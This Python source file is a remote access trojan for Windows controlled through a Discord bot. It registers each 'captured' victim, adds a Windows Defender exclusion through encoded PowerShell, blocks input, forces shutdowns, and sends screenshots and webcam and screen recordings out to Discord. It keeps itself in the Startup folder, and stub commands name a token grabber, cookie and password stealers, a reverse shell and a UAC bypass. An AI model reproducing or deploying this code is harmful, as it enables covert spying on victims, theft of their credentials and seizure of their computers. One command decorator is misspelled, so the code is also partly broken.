import asyncio
import os
import subprocess
import time
import zipfile
import sys
import shutil
import tkinter as tk
import ctypes
from concurrent.futures import ThreadPoolExecutor

# List of non-standard packages to install
NON_STANDARD_PACKAGES = [
    "discord.py",
    "pyautogui",
    "opencv-python",
    "numpy",
    "pywin32",
    "pygame",
    "pycaw",
    "pillow",
    "pycryptodome",
    "comtypes",
    "requests"
]

def install_packages():
    """Install non-standard Python packages with hidden console on Windows."""
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0

    for package in NON_STANDARD_PACKAGES:
        try:
            module_name = "cv2" if package == "opencv-python" else package.split(".")[0]
            __import__(module_name)
        except ImportError:
            print(f"Installing {package}...")
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package],
                    check=True,
                    creationflags=creationflags,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                print(f"Successfully installed {package}")
            except subprocess.CalledProcessError as e:
                print(f"Failed to install {package}: {e.stderr}")

# Run package installation at startup
install_packages()

# Import non-standard modules after installation
import discord
from discord.ext import commands, tasks
import pyautogui
import cv2
import numpy as np
import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *

# Set up Discord bot with intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
category_id="replaceme --> in builder category id"
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

    pc_username = os.getlogin()
    category_id = "" #builder replace this:

    category = bot.get_channel(category_id)
    if not category:
        print(f"Error: Could not find category with ID {category_id}")
        return

    channel = discord.utils.get(category.text_channels, name=pc_username.lower())

    if channel:
        await channel.send(f"PC turned on, user {pc_username} back online!")
    else:
        channel = await category.create_text_channel(pc_username)
        await channel.send(f"New user captured: {pc_username}!")

@bot.command()
async def exclusion(ctx):
    await ctx.send("3xc1usion has ben sent to the reg") 
    subprocess.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==")

@bot.command()
async def remove_exclusion(ctx):
    await ctx.send("3xc1usion has been removed from the reg")
    subprocess.run("powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA=")

@bot.command()
async def restart(ctx, seconds, message):
    await ctx.send(f"System will poweroff in {seconds}.")
    subprocess.run(f'shutdown /s /t {seconds} /c "{message}"', shell=True)

@bot.command()
async def screenshot_screen(ctx, seconds: int):
    await ctx.send(f"Starting screenshot capture for {seconds} seconds...")
    for i in range(seconds):
        filename = f"screenshot_{i}.png"
        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        # Send file to channel
        with open(filename, "rb") as f:
            picture = discord.File(f)
            await ctx.send(file=picture)
        # Delete file
        os.remove(filename)
        # Wait 1 second before next screenshot
        await asyncio.sleep(1)
    await ctx.send("Done capturing and sending screenshots.")


@bot.command()
async def dis_input(ctx, duration: int):
    """
    Blocks keyboard and mouse input for `duration` seconds.
    WARNING: Use carefully, as it will make the computer unresponsive temporarily.
    This should work system-wide, including in games.
    """
    await ctx.send(f"⛔ Blocking input for {duration} seconds...")

    # Block input (system-wide Windows API)
    ctypes.windll.user32.BlockInput(True)
    try:
        await asyncio.sleep(duration)
    finally:
        # Always unblock
        ctypes.windll.user32.BlockInput(False)

    await ctx.send("✅ Input unblocked!")



@bot.command()
async def open_browser(ctx, browser: str, url: str, tabs: int = 1):
    """
    Opens the specified URL in one or more tabs of a chosen browser.
    Usage examples:
      !open_browser edge https://example.com 3
      !open_browser chrome https://openai.com 2
      !open_browser all https://github.com 1
    """

    # Validate URL
    if not url.startswith("https://") and not url.startswith("http://"):
        await ctx.send("❌ Please provide a valid URL starting with https:// or http://")
        return

    # Normalize browser name
    browser = browser.lower()

    # Known browser paths (Windows default installs)
    browser_paths = {
    # Microsoft Edge (Standard + Dev + Beta)
    "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "edge_dev": r"C:\Program Files (x86)\Microsoft\Edge Dev\Application\msedge.exe",
    "edge_beta": r"C:\Program Files (x86)\Microsoft\Edge Beta\Application\msedge.exe",

    # Google Chrome (Standard + Beta + Canary)
    "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "chrome_beta": r"C:\Program Files\Google\Chrome Beta\Application\chrome.exe",
    "chrome_canary": r"C:\Users\%USERNAME%\AppData\Local\Google\Chrome SxS\Application\chrome.exe",

    # Mozilla Firefox (Standard + Developer + Nightly)
    "firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
    "firefox_dev": r"C:\Program Files\Firefox Developer Edition\firefox.exe",
    "firefox_nightly": r"C:\Program Files\Firefox Nightly\firefox.exe",

    # Brave Browser
    "brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",

    # Opera & Opera GX
    "opera": r"C:\Users\%USERNAME%\AppData\Local\Programs\Opera\launcher.exe",
    "opera_gx": r"C:\Users\%USERNAME%\AppData\Local\Programs\Opera GX\launcher.exe",

    # Vivaldi Browser
    "vivaldi": r"C:\Program Files\Vivaldi\Application\vivaldi.exe",

    # Tor Browser
    "tor": r"C:\Program Files\Tor Browser\Browser\firefox.exe",

    # Chromium (open-source Chrome)
    "chromium": r"C:\Program Files\Chromium\Application\chrome.exe",

    # Epic Privacy Browser
    "epic": r"C:\Users\%USERNAME%\AppData\Local\Epic Privacy Browser\Application\epic.exe",

    # Waterfox (Firefox fork)
    "waterfox": r"C:\Program Files\Waterfox\waterfox.exe",
    }


    # Validate browser choice
    if browser not in browser_paths and browser != "all":
        await ctx.send(f"❌ Unknown browser '{browser}'. Please choose: edge, chrome, firefox, or all.")
        return

    # Choose which browsers to open
    if browser == "all":
        targets = {name: path for name, path in browser_paths.items() if os.path.exists(path)}
        if not targets:
            await ctx.send("❌ No supported browsers found on this system.")
            return
        await ctx.send(f"🌐 Opening {tabs} tab(s) of {url} in all available browsers...")
    else:
        if not os.path.exists(browser_paths[browser]):
            await ctx.send(f"❌ {browser.capitalize()} not found at default path.")
            return
        targets = {browser: browser_paths[browser]}
        await ctx.send(f"🌐 Opening {tabs} tab(s) of {url} in {browser.capitalize()}...")

    # Launch browsers
    for name, path in targets.items():
        for _ in range(tabs):
            subprocess.Popen([path, "--new-tab", url])
            await asyncio.sleep(0.3)

    await ctx.send(f"✅ Successfully opened {tabs} tab(s) of {url} in {', '.join(targets.keys())}.")


MAX_DISCORD_FILESIZE = 10 * 1024 * 1024  # 10mB default limit
VIDEO_EXT = ".mp4"
ZIP_EXT = ".zip"

async def send_video_file(ctx, video_filename):
    """
    Sends a video file to Discord, zipping if necessary, and cleans up files.
    Returns True if sent successfully, False otherwise.
    """
    try:
        # Check if video file exists
        if not os.path.exists(video_filename):
            await ctx.send("❌ Error: Video file was not created.")
            return False

        file_size = os.path.getsize(video_filename)
        zip_filename = video_filename.replace(VIDEO_EXT, ZIP_EXT)

        # If file exceeds Discord's limit, create a zip
        if file_size > MAX_DISCORD_FILESIZE:
            try:
                with zipfile.ZipFile(zip_filename, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                    zipf.write(video_filename)
                
                # Check zip file size
                zip_size = os.path.getsize(zip_filename)
                if zip_size > MAX_DISCORD_FILESIZE:
                    await ctx.send(f"❌ Error: Zipped file ({zip_size / 1024 / 1024:.2f} MB) still exceeds Discord's 8MB limit.")
                    os.remove(video_filename)
                    if os.path.exists(zip_filename):
                        os.remove(zip_filename)
                    return False
                
                await ctx.send(f"⚠️ Video ({file_size / 1024 / 1024:.2f} MB) too large. Sending zipped version.")
                await ctx.send(file=discord.File(zip_filename))
                os.remove(video_filename)
                os.remove(zip_filename)
            except Exception as e:
                await ctx.send(f"❌ Error creating/sending zip file: {e}")
                os.remove(video_filename)
                if os.path.exists(zip_filename):
                    os.remove(zip_filename)
                return False
        else:
            await ctx.send(file=discord.File(video_filename))
            os.remove(video_filename)
        
        return True
    except Exception as e:
        await ctx.send(f"❌ Error sending file: {e}")
        if os.path.exists(video_filename):
            os.remove(video_filename)
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
        return False

@bot.command()
async def record_cam(ctx, seconds: int):
    """
    Records webcam video for the specified duration and sends it to Discord.
    """
    if seconds <= 0 or seconds > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording webcam for {seconds} seconds at 640x480 @ 30 FPS...")

    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            await ctx.send("❌ Could not access the camera.")
            return

        # Set resolution and FPS
        width, height = 640, 480
        fps = 30.0
        camera.set(cv2.CAP_PROP_FRAME_WIDTH, width)
        camera.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
        camera.set(cv2.CAP_PROP_FPS, fps)

        # Initialize video writer
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "webcam_video.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, fps, (width, height))

        start_time = time.time()
        while (time.time() - start_time) < seconds:
            ret, frame = camera.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture frame.")
                break
            out.write(frame)

        # Release resources
        camera.release()
        out.release()
        cv2.destroyAllWindows()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during webcam recording: {e}")
        if 'camera' in locals():
            camera.release()
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def record_screen(ctx, duration: int = 10):
    """
    Records the screen for the specified duration and sends it to Discord.
    """
    if duration <= 0 or duration > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"🎥 Recording screen for {duration} seconds...")

    try:
        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "screen_record.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during screen recording: {e}")
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def record_split(ctx, duration: int = 10):
    """
    Records both webcam and screen side-by-side for the specified duration and sends to Discord.
    """
    if duration <= 0 or duration > 300:
        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
        return

    await ctx.send(f"📹 Recording webcam + screen for {duration} seconds...")

    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send("❌ Could not open webcam.")
            return

        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_filename = "split_record.mp4"
        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame_cam = cam.read()
            if not ret:
                await ctx.send("⚠️ Failed to capture webcam frame.")
                break

            screenshot = pyautogui.screenshot()
            frame_screen = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)

            # Resize both to same height
            target_height = min(frame_cam.shape[0], frame_screen.shape[0])
            frame_cam = cv2.resize(frame_cam, (int(frame_cam.shape[1] * target_height / frame_cam.shape[0]), target_height))
            frame_screen = cv2.resize(frame_screen, (int(frame_screen.shape[1] * target_height / frame_screen.shape[0]), target_height))

            combined_frame = cv2.hconcat([frame_cam, frame_screen])
            combined_frame = cv2.resize(combined_frame, (screen_width, screen_height))
            out.write(combined_frame)

        cam.release()
        out.release()

        # Send the video file
        await send_video_file(ctx, video_filename)

    except Exception as e:
        await ctx.send(f"❌ Error during split recording: {e}")
        if 'cam' in locals():
            cam.release()
        if 'out' in locals():
            out.release()
        if os.path.exists(video_filename):
            os.remove(video_filename)

@bot.command()
async def clean_chat(ctx):
    """
    Deletes all messages in the current channel, including attachments and videos.
    """
    await ctx.send("🧹 Cleaning all messages in this channel...")

    def is_not_pinned(message):
        return not message.pinned

    deleted = True
    while deleted:
        # Bulk delete up to 100 messages at a time
        deleted = await ctx.channel.purge(limit=100, check=is_not_pinned)
    
    await ctx.send("✅ All messages deleted!", delete_after=5)

async def add_to_startup(file_path, file_name, startup_folder):
    """
    Helper function to copy a file to the startup folder and verify.
    Returns True if successful, False otherwise.
    """
    dest_path = os.path.join(startup_folder, file_name)
    try:
        if not os.path.exists(dest_path):
            shutil.copy2(file_path, dest_path)
        if os.path.exists(dest_path):
            return True
        return False
    except PermissionError:
        return False
    except Exception:
        return False

@tasks.loop(minutes=1.0)
async def check_startup():
    """
    Background task to check every minute if the file is in the startup folder.
    Re-adds it if missing.
    """
    try:
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()
        
        if file_ext not in ('.py', '.exe'):
            return  # Silently skip invalid files
        
        # Define C:\BotStartup path
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Check if file exists in startup folder
        startup_path = os.path.join(startup_folder, file_name)
        if not os.path.exists(startup_path):
            # Ensure C:\BotStartup file exists
            if os.path.exists(c_drive_path):
                # Re-add to startup
                if await add_to_startup(c_drive_path, file_name, startup_folder):
                    print(f"Re-added '{file_name}' to startup folder.")
                else:
                    print(f"Failed to re-add '{file_name}' to startup folder.")
    except Exception as e:
        print(f"Error in check_startup task: {e}")

@bot.command()
async def startup(ctx):
    """
    Copies the current Python script or executable to C:\BotStartup and Windows startup.
    Runs the bot from C:\BotStartup and checks startup folder every minute.
    """
    try:
        # Get the path to the currently running Python file or executable
        file_path = os.path.abspath(sys.argv[0])
        file_name = os.path.basename(file_path)
        file_ext = os.path.splitext(file_name)[1].lower()

        # Validate that the file is a Python script or executable
        if file_ext not in ('.py', '.exe'):
            await ctx.send("❌ Error: Only Python scripts (.py) or executables (.exe) can be added to startup.")
            return

        # Define C:\BotStartup folder
        c_drive_folder = r"C:\BotStartup"
        c_drive_path = os.path.join(c_drive_folder, file_name)

        # Create C:\BotStartup if it doesn't exist
        try:
            os.makedirs(c_drive_folder, exist_ok=True)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied creating C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error creating C:\BotStartup: {e}")
            return

        # Copy to C:\BotStartup
        try:
            shutil.copy2(file_path, c_drive_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to C:\BotStartup. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to C:\BotStartup: {e}")
            return

        # Verify copy to C:\BotStartup
        if not os.path.exists(c_drive_path):
            await ctx.send("❌ Error: Failed to verify file in C:\BotStartup.")
            return

        # Copy to startup folder
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if not os.path.exists(startup_folder):
            await ctx.send("❌ Error: Startup folder not found. Ensure you're running on Windows.")
            return

        startup_path = os.path.join(startup_folder, file_name)
        try:
            if not os.path.exists(startup_path):
                shutil.copy2(c_drive_path, startup_path)
        except PermissionError:
            await ctx.send("❌ Error: Permission denied copying to startup folder. Run as administrator.")
            return
        except Exception as e:
            await ctx.send(f"❌ Error copying to startup folder: {e}")
            return

        # Verify copy to startup folder
        if not os.path.exists(startup_path):
            await ctx.send("❌ Error: Failed to verify file in startup folder.")
            return

        # Start the background task to check startup folder (if not already running)
        if not check_startup.is_running():
            check_startup.start()

        await ctx.send(f"✅ Success! '{file_name}' copied to C:\BotStartup and added to Windows startup. "
                       f"Will run from C:\BotStartup and be checked every minute.")

    except Exception as e:
        await ctx.send(f"❌ An unexpected error occurred: {e}")
 
@bot.command()
async def tkn_grab(ctx):#done
    filename="discord_token_grabber.py"

@bot.command()
async def bsod(ctx):#done
    filename="bsod.py"

@bot.command()
async def get_cookies(ctx):#done
    filename="get_cookies.py"

@bot.command()
async def pass_light(ctx):#done
    filename="passwords_grabber.py"

@bot.command()
async def pass_heavy(ctx,bot_k,cat_id):#done
    filename="gruppe.py"

@bot.command()
async def reverse_shell(ctx):#done
    filename="reverse_shell"

@bot.comand()
async def uac(ctx):
    filename="uac_bypass.py"

# Run the bot --> in the builder replace this
bot.run('bot token here-->replace')